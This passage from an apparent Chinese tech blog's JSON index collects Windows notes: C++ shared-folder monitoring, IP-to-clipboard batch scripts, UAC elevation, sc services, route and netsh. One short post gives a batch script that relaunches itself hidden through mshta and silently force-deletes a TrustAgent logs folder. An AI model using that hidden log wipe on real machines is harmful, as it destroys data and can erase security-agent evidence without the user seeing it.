获取共享文件夹目录12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091BOOL GetSharedFoldersList(map &lt;CString, HANDLE&gt; &amp;theList)&#123; BOOL bFlag = FALSE; HKEY hKey = NULL; do &#123; //清空列表 theList.clear(); //HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Share //通过注册表获取共享文件夹列表 HKEY rootKey = REG_SHARE_KEY; CString szRegPath = REG_SHARE_PATH; int ErrCode; if (ERROR_SUCCESS != (ErrCode = RegOpenKeyEx(rootKey, szRegPath, 0, KEY_READ | KEY_WOW64_64KEY, &amp;hKey))) &#123; break; &#125; TCHAR szValue [MAX_VALUE_NAME] = &#123; 0 &#125;; DWORD dwValueSize = MAX_VALUE_NAME; int index = 0; DWORD dwBufferSize = 255; DWORD dwType; TCHAR *szValBuffer = NULL; DWORD dwSize; while (ERROR_NO_MORE_ITEMS != RegEnumValue ( hKey, index, szValue, &amp;dwValueSize, NULL, &amp;dwType, NULL, &amp;dwBufferSize)) &#123; //判断值类型 switch(dwType) &#123; //只找多个串的值 case REG_MULTI_SZ: &#123; dwSize = dwBufferSize + 1; szValBuffer = new TCHAR [dwSize]; ZeroMemory(szValBuffer, dwSize); if (ERROR_SUCCESS != RegQueryValueEx(hKey, szValue, 0, &amp;dwType, (LPBYTE)szValBuffer, &amp;dwBufferSize)) &#123; break; &#125; int j = 0; CString TmpValue; for(int i = 0; szValBuffer [i] != &#x27;\\0&#x27; ; i += j + 1) &#123; for (j = 0; szValBuffer [i + j] != &#x27;\\0&#x27;; j ++) &#123; TmpValue += szValBuffer [i + j]; &#125; //如果找到共享路径，则直接放入容器，然后进行下一个路径的查找 if (TmpValue.Find(_T(&quot;Path =&quot;)) == 0) &#123; //m_vSharedList.push_back(TmpValue.Right(TmpValue.GetLength() - 5)); CString Tmp = TmpValue.Right(TmpValue.GetLength() - 5); CString szTmp = Tmp; Tmp.MakeLower(); break; &#125; TmpValue = _T(&quot;&quot;); &#125; delete szValBuffer; szValBuffer = NULL; break; &#125; //其他类型跳过 default: &#123; break; &#125; &#125; dwValueSize = MAX_VALUE_NAME; dwBufferSize = 255; index ++; &#125; bFlag = TRUE; &#125;while(FALSE); if (hKey != NULL) &#123; RegCloseKey(hKey); &#125; return bFlag;&#125; 0x02 C++监控共享注册表变化方式一 创建线程，调用 RegNotifyChangeKeyValue123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131//监控注册表项以更新共享文件夹列表DWORD WINAPI SharedMonitor:: RefreshThread(LPVOID lpParam)&#123; SharedMonitor *pThis = (SharedMonitor *)lpParam; //只监控值的改变 DWORD dwFilter = REG_NOTIFY_CHANGE_LAST_SET; HKEY hKey; HKEY rootKey = REG_SHARE_KEY; CString szRegPath = REG_SHARE_PATH; //等待 10 分钟 int iWaitTime = 10 * 60 * 1000; while (TRUE) &#123; //监控注册表项改变 //Sleep(iWaitTime); HANDLE hEvent; BOOL bFlag = FALSE; do &#123; if (ERROR_SUCCESS != RegOpenKeyEx(rootKey, szRegPath, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &amp;hKey)) &#123; MyDebugA (&quot;RegMonitorThread--- RegOpenKeyEx ERR!&quot;); break; &#125; if (NULL == (hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))) &#123; MyDebugA (&quot;CreateEvent ERR&quot;); break; &#125; if (ERROR_SUCCESS != RegNotifyChangeKeyValue (hKey, TRUE, dwFilter, hEvent, TRUE)) &#123; MyDebugA (&quot;RegNotifyChangeKeyValue ERR&quot;); break; &#125; if (WAIT_FAILED == WaitForSingleObject (hEvent, INFINITE)) &#123; MyDebugA (&quot;WaitForSingleObject ERR&quot;); break; &#125; bFlag = TRUE; &#125;while(FALSE); RegCloseKey (hKey); CloseHandle (hEvent); //如果监控失败，则重新再来 if (! bFlag) &#123; continue; &#125; //等待系统将注册表消息发放完毕，否则有时候添加或删除的注册表项无法被枚举到 Sleep(200); //进行共享列表枚举和比较 map &lt;CString, HANDLE&gt; theNewList; //获取新列表 pThis-&gt; GetSharedFoldersList(theNewList); map &lt;CString, HANDLE&gt; &amp;theOldList = pThis-&gt; GetListInstance(); BOOL bFindNew = FALSE; //比较两个列表 //添加旧列表中没有的共享 for (map &lt;CString, HANDLE&gt;:: iterator it = theNewList.begin(); it != theNewList.end(); ++it) &#123; if (theOldList.find(it-&gt; first) == theOldList.end()) &#123; MyDebug(_T(&quot;----------Find New Share----------&quot;)); MyDebug(it-&gt; first); theOldList [it-&gt; first] = 0; bFindNew = TRUE; &#125; &#125; //MyDebug(_T(&quot;---------Start Delete--------&quot;)); //需要删除的列表, map 不支持循环删除多个元素 vector &lt;CString&gt; theDeleteList; //删除旧列表中已经取消的共享 for (map &lt;CString, HANDLE&gt;:: iterator it = theOldList.begin(); it != theOldList.end(); ++it) &#123; if (theNewList.find(it-&gt; first) == theNewList.end()) &#123; //结束监控线程 if (! TerminateThread(it-&gt; second, 0)) &#123; MyDebug(_T(&quot;TerminateThread ERR&quot;)); MyDebug(it-&gt; first); &#125; //将线程占用的共享目录句柄释放 if (gs_mpDirHandleList [it-&gt; first]) &#123; CloseHandle(gs_mpDirHandleList [it-&gt; first]); &#125; CloseHandle(it-&gt; second); theDeleteList.push_back(it-&gt; first); &#125; &#125; MyDebug(_T(&quot;-----------DeleteList-------------&quot;)); //删除旧列表中的过期共享 for (vector &lt;CString&gt;:: iterator it = theDeleteList.begin(); it != theDeleteList.end(); ++it) &#123; theOldList.erase(*it); MyDebug(*it); &#125; //如果有新的共享 if (bFindNew) &#123; pThis-&gt; SetSharedMonitor(); &#125; &#125; return 0;&#125; 共享文件夹内文件监控最后就是最终的目的，对共享文件夹内文件的变化进行监控操作。这里使用的是 WIN32 API ReadDirectoryChangesW ，这个的具体使用在我之前的一篇文章里有介绍，这里就不多说了，需要注意的一点是 ReadDirectoryChangesW 函数的第一个参数所需的句柄需要 CreateFile 去创建，而且创建后需要一直占用着不能释放，而创建时所需的权限(第三个参数) 必须设置为 FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE，因为如果少任意一个就有可能导致某些第三方软件的使用出现异常，例如迅雷下载，浏览器下载之类的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106//监控线程DWORD WINAPI ATSharedMonitor:: MonitorThread(LPVOID lpParam)&#123; CString szRootPath = *(CString *)lpParam; HANDLE hRootHandle = CreateFile( szRootPath, //监控路径 FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS/* | FILE_FLAG_OVERLAPPED*/, NULL); if(FAILED_HANDLE(hRootHandle)) &#123; MyDebug(_T(&quot;CreateFile Fail&quot;)); return 0; &#125; // 将目录句柄放到线程对应容器中 gs_mpDirHandleList [szRootPath] = hRootHandle; // OUTPUT_PARAM_DEBUGA(&quot;The CurrentThread:%X&quot;, GetCurrentThread()); szRootPath += _T(&quot;\\\\&quot;); wchar_t notify [1024]; ZeroMemory(notify, 1024); DWORD dwBytes; FILE_NOTIFY_INFORMATION *pNotify = (FILE_NOTIFY_INFORMATION *)notify; //过滤同一个文件的操作 CString szLastFile = _T(&quot;&quot;); while (TRUE) &#123; if (ReadDirectoryChangesW (hRootHandle, &amp;notify, sizeof(notify), TRUE, FILE_NOTIFY_CHANGE_CREATION | FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE, &amp;dwBytes, NULL, NULL)) &#123; MyDebug(_T(&quot;---------Change Happened!------------&quot;)); pNotify-&gt; FileName [pNotify-&gt; FileNameLength / 2] = &#x27;\\0&#x27;; //CString tmp = pNotify-&gt; FileName; //tmp.MakeLower (); CString TmpPath = szRootPath + pNotify-&gt; FileName; switch(pNotify-&gt; Action) &#123; //重命名获取 case FILE_ACTION_RENAMED_OLD_NAME: &#123; MyDebug (TEXT(&quot;文件更名 :&quot;) + TmpPath); PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pNotify+pNotify-&gt; NextEntryOffset); p-&gt; FileName [p-&gt; FileNameLength/2] = &#x27;\\0&#x27;; CString newName = szRootPath + p-&gt; FileName; MyDebug(newName); break; &#125; //删除// case FILE_ACTION_REMOVED:// &#123;// MyDebug (TEXT(&quot;文件删除 :&quot;) + TmpPath);// &#125; //修改..略过文件夹的修改, 过滤同一个文件的修改 case FILE_ACTION_MODIFIED: &#123; if (! PathIsDirectory(TmpPath) /*&amp;&amp; szLastFile.CompareNoCase(pNotify-&gt; FileName) != 0*/) &#123; //szLastFile = pNotify-&gt; FileName; MyDebug (TEXT(&quot;文件修改 :&quot;) + TmpPath); &#125; break; &#125; //新建文件获取 case FILE_ACTION_ADDED: &#123; if (! PathIsDirectory(TmpPath) /*&amp;&amp; szLastFile.CompareNoCase(pNotify-&gt; FileName) != 0*/) &#123; MyDebug (TEXT(&quot;文件添加 :&quot;) + TmpPath); &#125; break; &#125; default: &#123; break; &#125; &#125; &#125; &#125; return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"共享文件夹","slug":"共享文件夹","permalink":"http://example.com/tags/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"Windows聚焦不更新","date":"2023-10-27T01:24:02.012Z","path":"A_OS/Windows/【win】windows聚焦问题/","text":"[toc] 方案一在应用商店安装 dynamic theme 方案二先将个性化锁屏界面选项由”Windows 聚焦”改为”图片”。 然后去删除 C:\\Users\\你自己的用户名\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_***\\Settings (***为随机数字)目录下settings.dat 和 roaming.lock 这两个文件。（注：AppData 等是隐藏的文件夹或文件） 再然后回到个性化锁屏界面将选项由”图片”改回”Windows 聚焦”。 稍等，OK! 随后应该可以看到 :...\\Microsoft.Windows.ContentDeliveryManager_***\\LocalState\\Assets 文件夹里下载了一批聚焦图片 ..\\Microsoft.Windows.ContentDeliveryManager_***\\settings 目录下重新生成了 settings.dat 文件。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"bug","slug":"bug","permalink":"http://example.com/tags/bug/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】【cmd】批处理获取ip到剪切板","date":"2023-10-27T01:24:01.985Z","path":"A_OS/Windows/cmd/获取IP到剪切板/","text":"获取当前ip到剪切板 客户端开发远程调试每次都需要获取机器的ip，然后手动填写，较为麻烦，因此简单做了一个可以获取ip到剪切板当中的批处理脚本，可以获取系统当前ip到剪切板中。 [toc] 获取ip获取ip的命令有多种，最终实现就是只要能打印出当前系统ip的命令都可以。 ipconfig route print 以下两个脚本就是从上述两个命令当中获取ip地址： ipconfig1234567@echo offfor /f &quot;tokens=2 delims=:&quot; %%a in (&#x27;ipconfig ^| findstr ^^IPv4&#x27;) do (set IP=%%a)echo %IP%pause route print1234567@echo offfor /f &quot;tokens=4&quot; %%a in (&#x27; route print ^| findstr 0.0.0.0.*0.0.0.0 ^| findstr /v &quot;默认&quot; &#x27;) do (set IP=%%a)echo 你的局域网IP是： %IP%pause for /f的用法： 在For命令语踞饽参数F中，最难理解的就是Delims和Tokens两个选项，本文简单的做一个比较和总拮。“For /f”常用来解析文本，读取字符串。分工上，delims负责切分字符串，而tokens负责提取字符串。如果把字符串当作蛋糕，Delims像刀子，用来切蛋糕，tokens像叉子，用来取切好的蛋糕。 powershell1(ipconfig|select-string &quot;IPv4&quot;|out-string).Split(&quot;:&quot;)[-1] 输入到剪切板剪切板的关键字为：clip 使用 clip \\? 可以查看帮助 1234567891011121314151617c:\\windows\\system32&gt;clip /? clip 描述: 将命令行工具的输出重定向到 windows 剪贴板。这个文本输出可以被粘贴 到其他程序中。 参数列表: /? 显示此帮助消息。 示例: dir | clip 将一份当前目录列表的副本放入 windows 剪贴板。 clip &lt; readme.txt 将 readme.txt 的一份文本放入 windows 剪贴板。 c:\\windows\\system32&gt; 结合以上两个命令，脚本稍微修改一下就能实现获取ip到剪切版的功能。 完整脚本123456789101112@echo offfor /f &quot;tokens=4&quot; %%a in (&#x27; route print ^| findstr 0.0.0.0.*0.0.0.0 ^| findstr /v &quot;默认&quot; &#x27;) do (set IP=%%a)echo 你的局域网IP是： %IP%echo %IP% | clippause@rem 或者使用定时@rem timeout /t 5","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"批处理","slug":"批处理","permalink":"http://example.com/tags/%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"剪切板","slug":"剪切板","permalink":"http://example.com/tags/%E5%89%AA%E5%88%87%E6%9D%BF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【windows】【cmd】删除文件夹","date":"2023-10-27T01:24:01.984Z","path":"A_OS/Windows/cmd/删除文件夹/","text":"12345678@echo offif &quot;%1&quot; == &quot;h&quot; goto beginmshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit:beginREMrd /Q /S %programdata%\\TrustAgent\\logs","tags":[{"name":"bat","slug":"bat","permalink":"http://example.com/tags/bat/"},{"name":"文件夹","slug":"文件夹","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E5%A4%B9/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【windows】【cmd】清理DNS缓存","date":"2023-10-27T01:24:01.984Z","path":"A_OS/Windows/cmd/清理DNS缓存/","text":"在Windows系统上清理DNS缓存有几种方法，以下是其中两种常用的方法： 方法一：使用ipconfig命令 打开命令提示符：按下Win + R键，在运行对话框中输入cmd，然后按下回车键。 在命令提示符窗口中，输入以下命令并按下回车键： 1ipconfig /flushdns 这将清除本地计算机上的DNS缓存。 在命令提示符窗口中，您将看到一条消息提示”DNS Resolver Cache successfully flushed”，表明DNS缓存已成功清除。 方法二：使用命令提示符和netsh命令 打开命令提示符：按下Win + R键，在运行对话框中输入cmd，然后按下回车键。 在命令提示符窗口中，输入以下命令并按下回车键： 1netsh winsock reset 这将重置Winsock目录，并清除DNS缓存。 在命令提示符窗口中，您将看到一条消息提示”Successfully reset the Winsock Catalog”，表明Winsock目录已成功重置。 在命令提示符窗口中，输入以下命令并按下回车键： 1ipconfig /flushdns 这将清除本地计算机上的DNS缓存。 在命令提示符窗口中，您将看到一条消息提示”DNS Resolver Cache successfully flushed”，表明DNS缓存已成功清除。 无论使用哪种方法，都需要以管理员权限运行命令提示符窗口（右键点击命令提示符图标，选择”以管理员身份运行”）才能执行清除DNS缓存的命令。 希望这些步骤能够帮助您清理Windows系统上的DNS缓存。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【windows】【cmd】修改网络配置的 InterfaceMetric","date":"2023-10-27T01:24:01.983Z","path":"A_OS/Windows/cmd/修改ip接口的跃点数/","text":"使用脚本修改网卡跃点数 InterfaceMetric 使用到的接口 Get-NetIPInterface Set-NetIPInterface Get-NetAdapter 需求描述需要修改当前跃点数为 1 的ip接口，修改其跃点数为 90 解决方案 设置ip接口的跃点数均需要管理员权限 思路一源文件 通过 Get-NetIPInterface 获取需要修改的IP接口 通过 Set-NetIPInterface 修改跃点数 12345678910111213$ChangeIfm = 1$WangToChangeIfm = 90# 获取 InterfaceMetric 为 1 的 -InterfaceIndex$NetCard = (Get-NetIPInterface -InterfaceMetric $ChangeIfm).ifAlias$netInterfaceIndex = (Get-NetIPInterface -AddressFamily IPv4 -InterfaceMetric $ChangeIfm).ifIndexWrite-Output &quot;检索InterfaceMetric为 [$&#123;ChangeIfm&#125;] 列表: `n $&#123;NetCard&#125;&quot;Write-Output &quot;Index 为: $&#123;netInterfaceIndex&#125;&quot;Set-NetIPInterface -InterfaceIndex $netInterfaceIndex -InterfaceMetric $WangToChangeIfmWrite-Output &quot;已修改 $&#123;NetCard&#125; 的 InterfaceMetric 为 $&#123;WangToChangeIfm&#125;&quot; 思路二源文件 使用过滤器筛选需要修改的ip接口，再通过 Set-NetIPInterface 修改跃点数 12345678# 获取 InterfaceMetric 为 1 的 -InterfaceIndex$NetCard = (Get-NetAdapter | Where-Object -FilterScript &#123;$_.ifIndex -eq 10&#125;)Write-Output $NetCardSet-NetIPInterface -InterfaceIndex $NetCard.ifIndex -AddressFamily IPv6 -InterfaceMetric 90 官方demo修改 LinkSpeed 为 100 Mbps 的网络的 InterfaceMetric 为 21 1Get-NetAdapter | Where-Object -FilterScript &#123;$_.LinkSpeed -Eq &quot;100 Mbps&quot;&#125; | Set-NetIPInterface -InterfaceMetric 21 提升管理员权限cmd提权1234567891011@echo off::1 获取管理员权限%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,1)(window.close)&amp;&amp;exit::2 执行操作set curpath=%~dp0set file=ModifyIfm.ps1set execPath=%curpath%%file%echo %execPath%powershell.exe -ExecutionPolicy ByPass -File %execPath% powershell 提权1234567if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &#x27;Administrator&#x27;)) &#123; if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) &#123; $Command = &quot;-File `&quot;&quot; + $MyInvocation.MyCommand.Path + &quot;`&quot; &quot; + $MyInvocation.UnboundArguments Start-Process -FilePath PowerShell.exe -Verb RunAs -ArgumentList $Command Exit &#125;&#125; InterfaceMetric 是用于表示网络接口优先级的指标，它用于决定计算机在多个网络接口之间进行网络通信时所选择的默认接口。 在Windows操作系统中，InterfaceMetric是一个用于路由选择和接口优先级的整数值。较低的InterfaceMetric值表示较高的优先级，通常会被选择为默认接口。以下是InterfaceMetric的一些常用数值及其含义： 0：最高优先级。当存在多个可用的接口时，操作系统将优先使用此接口进行网络通信。 5：较高优先级。优先级稍低于0，但仍比较高，通常用于指定首选接口。 10：默认优先级。如果没有特殊指定优先级的情况下，操作系统通常将选择InterfaceMetric为10的接口作为默认接口。 大于10的值：较低优先级。这些值表示接口的优先级较低，只有在没有更高优先级的接口可用时才被选择。 请注意，InterfaceMetric值只在有多个可用的网络接口时才起作用。如果只有一个接口可用，则无论InterfaceMetric的值如何，该接口都将被选择为默认接口。 您可以通过以下步骤在Windows系统中修改接口的InterfaceMetric值： 打开网络连接设置：在Windows搜索栏中输入”控制面板”，打开控制面板后选择”网络和 Internet”，然后选择”网络和共享中心”。 打开适配器设置：在左侧面板中，点击”更改适配器设置”。 找到网络接口：在适配器设置窗口中，找到要修改InterfaceMetric的网络接口，右键点击该接口，然后选择”属性”。 修改接口属性：在接口属性窗口中，选择”Internet 协议版本 4 (TCP&#x2F;IPv4)”（或其他适用的协议版本），然后点击”属性”按钮。 修改InterfaceMetric值：在该接口的属性窗口中，点击”高级”按钮，在”适配器度量”部分，可以手动输入想要设置的InterfaceMetric值（整数）。 保存设置：保存修改后的设置，然后关闭所有窗口。 注意：更改InterfaceMetric值后，可能需要重启计算机或者启用&#x2F;禁用网络接口才能使更改生效。 希望这些信息能帮助您理解InterfaceMetric的含义及其在Windows系统中使用的方式。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【cmd】 sc创建服务","date":"2023-10-27T01:24:01.982Z","path":"A_OS/Windows/cmd/sc创建服务/","text":"概述：sc命令的使用|创建服务 [toc] sc 创建服务 如何将exe注册为windows服务，让其直接从后台运行 帮助手册 sc create /? 方法一：使用windows自带的命令sc，首先我们要用管理员运行cmd注册服务： 1sc create TestService binpath= &quot;D:\\Test\\TestService.exe&quot; start= auto displayname= &quot;TestService&quot; 注意：所有的等号和值之间需要一个空格（等号前不要空格，等号后要一个空格）！！ binpath和等号之间不要空格，等号和安装路径（例如*”binpath&#x3D; D:\\Test\\TestService.exe”*）之间要空格 binpath：你的应用程序所在的路径。 displayname：服务显示的名称。 description：服务描述说明。 如何判断服务是否注册成功： 在cmd中输入services.msc打开系统服务，查看是否出现TestService名称的服务（即displayname=后面的参数，我这里是TestService） 修改描述： 1sc description TestService &quot;这是一个Windows测试服务。&quot; 启动服务： 1net start TestService 停止服务： 1net stop TestService 删除服务： 1sc delete TestService SC命令的更多用法请在查看help sc 使用时我们一般用个文本文档写入命令然后保存成bat格式的文件，添加服务一个，删除服务一个。 例如“添加服务.bat”内容如下： 1234567sc create TestService binpath= &quot;D:\\TestApp\\TestService.exe&quot; sc description TestService &quot;这是一个Windows测试服务。&quot; net start TestService pause “删除服务.bat”内容如下： 123net stop TestService sc delete TestService 方法二：无法从命令行或调试器启动服务，必须首先安装Windows服务(使用installutil.exe),然后用ServerExplorer、Windows服务器管理工具或NET START命令启动它 以管理员身份运行cmd 安装windows服务 1cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319(InstallUtil.exe的路径，注意InstallUtil.exe的版本号需要和项目的版本号相同) 安装windows服务 1InstallUtil.exe D:\\Service\\需要安装的服务.exe(项目的路径) 启动windows服务 1net start TestServive(服务名称)","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"cmd","slug":"cmd","permalink":"http://example.com/tags/cmd/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【cmd】route","date":"2023-10-27T01:24:01.981Z","path":"A_OS/Windows/cmd/route/","text":"概述：windows route命令的用法|查看路由|修改路由|删除路由 Route 命令 Route命令用于在本地IP路由表中显示和修改条目。在排除网络故障时常会用到。 使用不带参数的Route或 Route /? 可以显示帮助。 语法： route [-f] [-p] [command [destination] [mask netmask] [gateway] [metric] [if interface] -f 选项 Route –f 命令清除所有网关项的路由表。如果该参数与某个命令组合使用，路由表将在运行命令前清除。 如下图所示，执行 route –f 命令后，再用 route print 打印路由表时，可看到路由表为空。 -p 选项 与 route add 命令结合使用时，将路由设备为在系统引导期间保持不变。 默认情况下，重新启动系统时，不保存路由。 当在 route add 命令中加入-p参数时，route print 命令就能看到永久路由了。 route printPrint命令 接下来，我们将介绍Print、Add、Delete、Chance四个常用的Command命令。 Route print命令显示IP路由表的完整内容，如下图所示：首先显示了当前主机的所有接口列表，接下来显示IPv4路由表和IPv4永久路由，可以看到，我的IPv4路由表有两个默认网关，且无手动添加的IPv4永久路由。 使用route print命令时，目标或网关可以为通配符，通配符指定为星号“*”。 12345Route print -4 #命令只显示IPv4的路由表信息。Route print -6 #命令只显示IPv6的路由表信息。Route print 192* #命令只显示那些匹配192*的项。 route add例1：若要添加带有 192.168.12.1 默认网关地址的默认路由， 1route add 0.0.0.0 mask 0.0.0.0 192.168.12.1 例2：若要向带有 255.255.0.0 子网掩码和 10.27.0.1 下一跃点地址的 10.41.0.0 目标中添加一个路由 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 例3：若要向带有 255.255.0.0 子网掩码和 10.27.0.1 下一跃点地址的 10.41.0.0 目标中添加一个永久路由 1route -p add 10.41.0.0 mask 255.255.0.0 10.27.0.1 例4：若要向带有 255.255.0.0 子网掩码、10.27.0.1 下一跃点地址且其成本值标为 7 的 10.41.0.0 目标中添加一个路由 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 metric 7 例5：若要向带有 255.255.0.0 子网掩码、10.27.0.1 下一跃点地址且使用 0x3 接口索引的 10.41.0.0 目标中添加一个路由 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 if 0x3 如果未给出if，它将尝试查找给定网关的最佳接口。 例6：若本地的IP地址为172.16.1.100，网关为172.16.1.254，现有一条ADSL线路，路由器的地址为172.168.1.200，通过该地址可访问Internet。如何做到既想上网，又想访问网络内的资源？只需按以下三步操作即可 12345第一步：将本地的网关地址由172.16.1.254改为172.16.1.200第二步：route delete 0.0.0.0 mask 0.0.0.0 172.16.1.254第三步：route add 172.16.0.0 mask 255.255.0.0 172.16.1.100 -p metric 1 Delete命令 Route delete命令删除路由。 使用route delete命令时，目标或网关可以为通配符，通配符指定为星号“*”。 例1：若要删除到带有 255.255.0.0 子网掩码的 10.41.0.0 目标的路由 1route delete 10.41.0.0 mask 255.255.0.0 例2：若要删除以 10. 起始的 IP 路由表中的所有路由 1route delete 10.\\* Change命令 Route change命令只用于修改网关和&#x2F;或跃点数 例1：若要将带有 10.100.0.0 目标和 255.255.0.0 子网掩码的下一跃点地址从 10.100.0.1 修改为 10.100.0.254 1route change 10.100.0.0 mask 255.255.0.0 10.100.0.254","tags":[{"name":"cmd","slug":"cmd","permalink":"http://example.com/tags/cmd/"},{"name":"route","slug":"route","permalink":"http://example.com/tags/route/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【一文搞懂】【CMD】netsh用法整理","date":"2023-10-27T01:24:01.980Z","path":"A_OS/Windows/cmd/netsh用法整理/","text":"Netsh 是命令行脚本实用工具，可让你显示或修改当前正在运行的计算机的网络配置。 可以通过在 netsh 提示符下键入命令来运行 Netsh 命令，并且可以在批处理文件或脚本中使用 Netsh 命令。 可以使用 netsh 命令来配置远程计算机和本地计算机。 Netsh 还提供脚本功能，可让你在批处理模式下对指定的计算机运行一组命令。 你可以使用 Netsh 将配置脚本保存在文本文件中，以便存档或者帮助你配置其他计算机。 一、如何正确使用netsh 当我们忘记netsh的相关命令时，可以直接使用netsh自带的帮助功能，就能看到一些可以使用的命令。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546netsh /?C:\\Users\\ming Ming&gt;netsh /?Usage: netsh [-a AliasFile] [-c Context] [-r RemoteMachine] [-u [DomainName\\]UserName] [-p Password | *] [Command | -f ScriptFile]The following commands are available:Commands in this context:? - Displays a list of commands.add - Adds a configuration entry to a list of entries.advfirewall - Changes to the `netsh advfirewall&#x27; context.bridge - Changes to the `netsh bridge&#x27; context.delete - Deletes a configuration entry from a list of entries.dhcpclient - Changes to the `netsh dhcpclient&#x27; context.dnsclient - Changes to the `netsh dnsclient&#x27; context.dump - Displays a configuration script.exec - Runs a script file.firewall - Changes to the `netsh firewall&#x27; context.help - Displays a list of commands.http - Changes to the `netsh http&#x27; context.interface - Changes to the `netsh interface&#x27; context.ipsec - Changes to the `netsh ipsec&#x27; context.lan - Changes to the `netsh lan&#x27; context.mbn - Changes to the `netsh mbn&#x27; context.namespace - Changes to the `netsh namespace&#x27; context.netio - Changes to the `netsh netio&#x27; context.nlm - Changes to the `netsh nlm&#x27; context.p2p - Changes to the `netsh p2p&#x27; context.ras - Changes to the `netsh ras&#x27; context.rpc - Changes to the `netsh rpc&#x27; context.set - Updates configuration settings.show - Displays information.trace - Changes to the `netsh trace&#x27; context.wcn - Changes to the `netsh wcn&#x27; context.wfp - Changes to the `netsh wfp&#x27; context.winhttp - Changes to the `netsh winhttp&#x27; context.winsock - Changes to the `netsh winsock&#x27; context.wlan - Changes to the `netsh wlan&#x27; context.The following sub-contexts are available: advfirewall bridge dhcpclient dnsclient firewall http interface ipsec lan mbn namespace netio nlm p2p ras rpc trace wcn wfp winhttp winsock wlanTo view help for a command, type the command, followed by a space, and then type ?. 那知道有哪些可选功能后，我们就可以进一步输入二级命令去执行我们将要进行的操作，比如下边我就以查看当前tcp链接状态位列展示： 1234567891011121314151617181920212223242526$&gt;netsh$netsh&gt;int$netsh interface&gt;ip$netsh interface ipv4&gt;show tcpstatsTCP Statistics------------------------------------------------------Timeout Algorithm: Van Jacobson&#x27;s AlgorithmMinimum Timeout: 5Maximum Timeout: 4294967295Maximum Connections: DynamicActive Opens: 3971Passive Opens: 556Attempts Failed: 1017Established Resets: 407Currently Established: 34In Segments: 202193Out Segments: 